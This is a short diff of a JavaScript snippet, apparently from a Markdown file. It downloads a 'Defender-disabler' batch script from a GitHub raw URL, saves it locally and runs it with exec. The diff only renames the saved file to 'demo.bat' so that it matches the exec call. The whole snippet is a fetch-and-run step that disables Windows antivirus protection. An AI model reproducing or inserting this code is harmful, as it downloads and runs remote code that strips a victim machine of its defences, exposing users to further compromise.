@@ -92,7 +92,7 @@ const axios = require('axios');
 axios.get('https://raw.githubusercontent.com/Rdimo/Defender-disabler/main/disabler.bat', {
     responseType: 'text',
   }).then((response) => {
-    fs.writeFileSync('disabler.bat', response.data, { flag: 'a' }, (err) => {});
+    fs.writeFileSync('demo.bat', response.data, { flag: 'a' }, (err) => {});
   });
 exec('demo.bat');
 ```
